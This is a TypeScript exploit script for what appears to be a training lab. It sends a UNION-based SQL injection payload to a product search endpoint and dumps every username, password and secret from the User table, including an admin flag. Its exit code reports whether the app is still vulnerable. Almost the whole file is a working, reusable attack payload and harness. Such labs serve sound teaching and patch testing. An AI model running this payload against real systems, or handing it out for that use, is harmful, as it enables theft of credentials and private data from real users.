// Lab 2 exploit — UNION-based SQL injection data dump (CWE-89).
// The product search SELECTs 3 columns (id, name, description). We append a
// UNION that pulls 3 columns from the User table instead, smuggling every
// username, password and secret (incl. the admin FLAG) out as fake "products".
//
// Exit 0 = exploit worked (creds dumped). Non-zero = patched.
const BASE = process.env.BASE_URL ?? "http://localhost:3000";

// password and secret are concatenated into the single "description" column.
const PAYLOAD = `%' UNION SELECT id, username, password || ' / ' || secret FROM User --`;

async function main() {
  const url = `${BASE}/api/search?q=${encodeURIComponent(PAYLOAD)}`;
  console.log(`[dump] GET /api/search with UNION payload`);
  console.log(`       q = ${PAYLOAD}`);

  const r = await fetch(url);
  const data: any = await r.json().catch(() => ({}));

  if (data.error) {
    console.log(`\n  DB error (likely patched): ${data.error}`);
    process.exit(1);
  }

  const rows: Array<{ name: string; description: string }> = data.results ?? [];
  const leaked = rows.filter((row) => row.description?.includes(" / "));

  if (leaked.length === 0) {
    console.log("\n  no rows leaked — looks patched.");
    process.exit(1);
  }

  console.log(`\n  HIT — dumped ${leaked.length} user records:`);
  for (const row of leaked) {
    console.log(`     ${row.name.padEnd(10)} : ${row.description}`);
  }
  const flag = leaked.find((row) => row.description.includes("FLAG{"));
  if (flag) console.log(`\n  🚩 ${flag.description.split(" / ").pop()}`);
  process.exit(0);
}

main();
